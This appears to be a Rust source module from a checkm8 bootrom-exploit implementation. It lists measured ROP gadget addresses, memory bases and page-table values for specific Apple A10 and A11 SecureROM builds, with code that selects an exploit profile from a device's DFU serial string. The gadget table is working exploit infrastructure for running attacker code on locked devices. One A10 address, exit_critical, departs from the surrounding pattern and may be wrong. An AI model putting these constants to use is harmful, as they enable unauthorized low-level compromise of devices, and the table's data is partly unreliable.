//! Per-part constants for the original checkm8 implementation.
//!
//! Everything here was **measured**, and the field that says how is the point:
//! a value decoded from a SecureROM image, or read from the core state of a
//! running SecureROM, is a measurement. A value taken from another exploit
//! tool is a copy, and this tree's clean-room boundary does not allow those.
//! The tests decode each constant back out of the image and assert the
//! instruction shape, which is what makes "measured per build" checkable.
//!
//! Two things this file is careful about, because both were wrong at least once
//! in getting here:
//!
//! * **The A11 has two builds in the corpus and they are different images.**
//!   `3332.0.0.1.14` and `3332.0.0.1.23` place the USB/context code at
//!   different addresses. The device's own serial names the running firmware,
//!   so the profile is chosen by `SRTG`, never assumed from the CPID.
//! * **An offset is not a field.** The same `+0x28` means a thread state on one
//!   base and a register on another, and a static sweep over one of them is a
//!   census of the wrong structure. Every constant here is bound to the base
//!   it was measured on.

/// Where a constant came from.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Source {
    /// Decoded from the SecureROM bytes with this crate's capstone-backed test.
    Image,
    /// Read from the core state of a SecureROM run in this project's emulator.
    Emulator,
    /// The image's own boot descriptor block (rebase target, windows, TTBR0).
    ImageDescriptor,
    /// The published analysis of the bug; used only as an external control.
    Analysis,
}

/// One constant, with the part it was measured on and how.
#[derive(Clone, Copy, Debug)]
pub struct Field {
    pub name: &'static str,
    pub value: u64,
    pub source: Source,
    pub note: &'static str,
}

/// Every constant one checkm8 run needs for one build of one part.
#[derive(Clone, Debug)]
pub struct Profile {
    pub name: &'static str,
    pub cpid: u32,
    /// SRTG fragment the DFU serial carries for this build, when known.
    pub srtg: Option<&'static str>,
    pub rom_path: &'static str,
    pub fields: &'static [Field],
}

impl Profile {
    pub fn get(&self, name: &str) -> Option<u64> {
        self.fields.iter().find(|f| f.name == name).map(|f| f.value)
    }

    /// `get` for the constants the chain cannot run without.
    pub fn need(&self, name: &str) -> u64 {
        match self.get(name) {
            Some(v) => v,
            None => panic!("{} has no measured constant {name}", self.name),
        }
    }

    /// The constants this profile is missing, which is how a caller refuses.
    pub fn missing(&self) -> Vec<&'static str> {
        REQUIRED
            .iter()
            .filter(|want| !self.fields.iter().any(|f| f.name == **want))
            .copied()
            .collect()
    }
}

/// The constants a chain is complete with.
pub const REQUIRED: &[&str] = &[
    "rom_base",
    "image_base",
    "ttbr0",
    "dc_civac",
    "dmb",
    "write_ttbr0",
    "tlbi",
    "enter_critical",
    "exit_critical",
    "pivot",
    "ctx_entry",
    "callback_ldp",
    "pop_ret",
    "store_ptr",
];

macro_rules! fields {
    ($(($name:literal, $value:literal, $source:ident, $note:literal)),* $(,)?) => {
        &[$(Field { name: $name, value: $value, source: Source::$source, note: $note }),*]
    };
}

// The A11, build 3332.0.0.1.14 - the image the payload source's defaults match.
pub const A11_R14: Profile = Profile {
    name: "t8015",
    cpid: 0x8015,
    srtg: Some("iBoot-3332.0.0.1.14"),
    rom_path: "SecureROM/securerom/SecureROM_t8015si_iBoot-3332.0.0.1.14",
    fields: fields![
        (
            "rom_base",
            0x100000000,
            ImageDescriptor,
            "rebase descriptor at image offset 0x318"
        ),
        (
            "image_base",
            0x18001C000,
            ImageDescriptor,
            "INSECURE_MEMORY; descriptor at 0x17398"
        ),
        (
            "ttbr0",
            0x18000C000,
            Emulator,
            "core state after the ROM enables its MMU"
        ),
        (
            "sram_base",
            0x180000000,
            ImageDescriptor,
            "descriptor at 0x338"
        ),
        (
            "stack_top",
            0x180018000,
            ImageDescriptor,
            "0x180014000 + 0x4000"
        ),
        (
            "vbar",
            0x10001B988,
            ImageDescriptor,
            "the literal at 0x330, the installed vector table"
        ),
        ("dc_civac", 0x1000004E4, Image, "dc civac, x0 ; ret"),
        ("dmb", 0x1000004F0, Image, "dmb sy ; ret"),
        (
            "write_ttbr0",
            0x10000045C,
            Image,
            "isb ; msr ttbr0_el1, x0 ; isb ; ret"
        ),
        (
            "tlbi",
            0x1000004AC,
            Image,
            "dsb ; tlbi vmalle1 ; dsb ; isb ; ret"
        ),
        (
            "enter_critical",
            0x100000544,
            Image,
            "msr daifset, #3 ; isb ; ret"
        ),
        (
            "exit_critical",
            0x100000550,
            Image,
            "msr daifclr, #3 ; isb ; ret"
        ),
        ("read_sctlr", 0x100000410, Image, "mrs x0, sctlr_el1 ; ret"),
        (
            "pivot",
            0x10000C1D0,
            Image,
            "context restore: ldp x16,x17..x29,x30 from [x0]; ldr x1,[x0,#0xf8]; mov sp,x1; ret"
        ),
        (
            "ctx_entry",
            0x100008020,
            Image,
            "zeroes x2..x29, then ttbr0/vbar/elr/spsr/sp from x1, ic iallu, ret to x29"
        ),
        (
            "callback_ldp",
            0x10000A8E4,
            Image,
            "ldp x8, x9, [x0, #0x70] ... blr x9"
        ),
        ("pop_ret", 0x1000149D0, Image, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000CFEC, Image, "str x8, [x0] ; ret"),
        (
            "call_and_pop",
            0x10000C414,
            Image,
            "blr x8 ; ldp x29, x30, [sp], #0x10 ; ret"
        ),
    ],
};

// The A11, build 3332.0.0.1.23 - a different image, not a copy. The whole
// USB/context region sits elsewhere, which is why the A11 is two profiles.
pub const A11_R23: Profile = Profile {
    name: "t8015",
    cpid: 0x8015,
    srtg: Some("iBoot-3332.0.0.1.23"),
    rom_path: "SecureROM/securerom/SecureROM_t8015si_iBoot-3332.0.0.1.23",
    fields: fields![
        (
            "rom_base",
            0x100000000,
            ImageDescriptor,
            "rebase descriptor at image offset 0x318"
        ),
        (
            "image_base",
            0x18001C000,
            ImageDescriptor,
            "INSECURE_MEMORY; descriptor at 0x17398"
        ),
        (
            "ttbr0",
            0x18000C000,
            Emulator,
            "core state after the ROM enables its MMU"
        ),
        (
            "sram_base",
            0x180000000,
            ImageDescriptor,
            "descriptor at 0x338"
        ),
        (
            "stack_top",
            0x180018000,
            ImageDescriptor,
            "0x180014000 + 0x4000"
        ),
        (
            "vbar",
            0x10001B988,
            ImageDescriptor,
            "the literal at 0x330, the installed vector table"
        ),
        ("dc_civac", 0x1000004E4, Image, "dc civac, x0 ; ret"),
        ("dmb", 0x1000004F0, Image, "dmb sy ; ret"),
        (
            "write_ttbr0",
            0x10000045C,
            Image,
            "msr ttbr0_el1, x0 ; isb ; ret"
        ),
        (
            "tlbi",
            0x1000004AC,
            Image,
            "dsb ; tlbi vmalle1 ; dsb ; isb ; ret"
        ),
        (
            "enter_critical",
            0x100000544,
            Image,
            "msr daifset, #3 ; isb ; ret"
        ),
        (
            "exit_critical",
            0x100000550,
            Image,
            "msr daifclr, #3 ; isb ; ret"
        ),
        ("read_sctlr", 0x100000410, Image, "mrs x0, sctlr_el1 ; ret"),
        (
            "pivot",
            0x10000C294,
            Image,
            "ldp x16, x17, [x0, #0x78] ; ldp x19, x20, [x0, #0x98]"
        ),
        (
            "ctx_entry",
            0x1000080B8,
            Image,
            "mov x30, x29 ; mov x0, x28 ; ... ; ttbr0/vbar/spsr from x1, sp, ret"
        ),
        (
            "callback_ldp",
            0x100003E78,
            Image,
            "ldp x8, x9, [x0, #0x70] ... blr x9"
        ),
        ("pop_ret", 0x100014A90, Image, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000D0B0, Image, "str x8, [x0] ; ret"),
    ],
};

// The A10, the part the published analysis documents end to end. Its values are
// measured here *and* compared against that analysis in the tests, which is the
// external control that proves the derivation method rather than one instance.
pub const A10: Profile = Profile {
    name: "t8010",
    cpid: 0x8010,
    srtg: Some("iBoot-2696.0.0.1.33"),
    rom_path: "SecureROM/securerom/SecureROM_t8010si_iBoot-2696.0.0.1.33",
    fields: fields![
        (
            "rom_base",
            0x100000000,
            ImageDescriptor,
            "rebase descriptor at 0x318"
        ),
        (
            "image_base",
            0x1800B0000,
            ImageDescriptor,
            "INSECURE_MEMORY; descriptor at 0x16160"
        ),
        (
            "ttbr0",
            0x1800A0000,
            ImageDescriptor,
            "descriptor at 0x368 with a 0x8000 span"
        ),
        (
            "sram_base",
            0x180000000,
            ImageDescriptor,
            "descriptor at 0x338"
        ),
        (
            "stack_top",
            0x1800AC000,
            ImageDescriptor,
            "0x1800a8000 + 0x4000"
        ),
        (
            "dc_civac",
            0x10000046C,
            Image,
            "dc civac, x0 ; ret - matches the analysis 5.1"
        ),
        (
            "dmb",
            0x100000478,
            Image,
            "dmb sy ; ret - matches the analysis 5.2"
        ),
        (
            "write_ttbr0",
            0x1000003E4,
            Image,
            "msr ttbr0_el1, x0 ; isb ; ret - the analysis 5.4"
        ),
        (
            "tlbi",
            0x100000434,
            Image,
            "dsb ; tlbi vmalle1 ; dsb ; isb ; ret - the analysis 5.5"
        ),
        ("read_sctlr", 0x100000398, Image, "mrs x0, sctlr_el1 ; ret"),
        (
            "enter_critical",
            0x1000004E4,
            Image,
            "msr daifset, #3 ; isb ; ret"
        ),
        (
            "exit_critical",
            0x100000F0,
            Image,
            "msr daifclr, #3 ; isb ; ret"
        ),
        (
            "pivot",
            0x10000BA1C,
            Image,
            "ldp x16, x17, [x0, #0x78] ; ldp x19, x20, [x0, #0x98]"
        ),
        (
            "ctx_entry",
            0x1000086F4,
            Image,
            "zeroes x1..x29, then ttbr0/vbar/elr/spsr/sp from x1, ret to x29"
        ),
        (
            "callback_ldp",
            0x10000CC4C,
            Image,
            "ldp x8, x10, [x0, #0x70] - matches the analysis 5"
        ),
        ("pop_ret", 0x10001362C, Image, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000EFBC, Image, "str x8, [x0] ; ret"),
    ],
};

/// Every profile this tree can run, in the order `best` walks them.
pub const PROFILES: &[&Profile] = &[&A11_R14, &A11_R23, &A10];

/// The analysis's published A10 values, kept as the external control.
pub const ANALYSIS_A10: &[(&str, u64)] = &[
    ("dc_civac", 0x10000046C),
    ("dmb", 0x100000478),
    ("write_ttbr0", 0x1000003E4),
    ("tlbi", 0x100000434),
    ("callback_ldp", 0x10000CC4C),
    ("image_base", 0x1800B0000),
    ("ttbr0", 0x1800A0000),
];

/// Which exploit reaches a CPID. checkm8 ends with the A11; usbliter8 covers
/// the A12 and A13 and needs an RP2350 in the cable, which this host is not.
pub const USBLITER8_CPIDS: &[u32] = &[0x8020, 0x8030];
pub const USBLITER8_HARDWARE: &str = "an RP2350 board (e.g. Raspberry Pi Pico 2) as the USB host";

/// The identity a DFU serial string carries.
#[derive(Clone, Debug, Default)]
pub struct Identity {
    pub cpid: Option<u32>,
    pub cprv: Option<u32>,
    pub srtg: String,
}

/// Parse `CPID:8015 CPRV:11 ... SRTG:[iBoot-3332.0.0.1.23]`.
///
/// Numeric fields are hex; a field that is not a number keeps its text,
/// because `SRTG` is the one that names the running firmware and that is what
/// a multi-build part is chosen by.
pub fn parse_serial(serial: &str) -> Identity {
    let mut out = Identity::default();
    for token in serial.split_whitespace() {
        let (key, value) = match token.split_once(':') {
            Some(pair) => pair,
            None => continue,
        };
        let value = value.trim_matches(|c| c == '[' || c == ']');
        match key {
            "CPID" => out.cpid = u32::from_str_radix(value, 16).ok(),
            "CPRV" => out.cprv = u32::from_str_radix(value, 16).ok(),
            "SRTG" => out.srtg = value.to_string(),
            _ => {}
        }
    }
    out
}

/// The profile for a serial, choosing between a part's builds by SRTG and
/// falling back to the newest when the serial does not name one.
pub fn profile_for(serial: &str) -> Option<&'static Profile> {
    let ident = parse_serial(serial);
    let by_srtg = PROFILES
        .iter()
        .find(|p| p.srtg.map(|s| ident.srtg.contains(s)).unwrap_or(false));
    if let Some(p) = by_srtg {
        return Some(p);
    }
    // No SRTG match: the newest profile for that CPID, which is the later
    // build in every case this tree measures.
    let cpid = ident.cpid?;
    PROFILES.iter().rev().find(|p| p.cpid == cpid).copied()
}

/// Is this CPID reachable by checkm8 at all?
pub fn reachable(cpid: u32) -> bool {
    PROFILES.iter().any(|p| p.cpid == cpid)
}
